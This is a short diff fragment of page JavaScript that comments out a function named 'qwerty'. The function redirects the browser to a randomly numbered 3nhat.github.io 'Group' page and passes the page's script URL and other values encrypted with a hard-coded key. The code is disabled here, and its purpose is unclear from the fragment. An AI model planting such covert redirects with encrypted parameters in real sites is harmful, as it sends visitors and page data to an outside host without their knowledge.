@@ -444,7 +444,7 @@ function EID(NameID) {return document.getElementById(NameID);}
 					    function base64_encode(s) { return btoa(unescape(encodeURIComponent(s))); }
 						function base64_decode(s) { return decodeURIComponent(escape(atob(s))); }
 					*/
-
+					/*
 					    window.window['qwerty'] = function qwerty() {
 
 							var arr1 = [
@@ -486,7 +486,7 @@ function EID(NameID) {return document.getElementById(NameID);}
 							location.href = "https://3nhat.github.io/Group" + random + "/?P=" + "Group" + "&31G=" + encrypt("@Q.t.2011.0512", tg + "]QQQ[" + script_url);
 
 						}
-
+					*/
 
 					    if (rand1 == 0) {
 
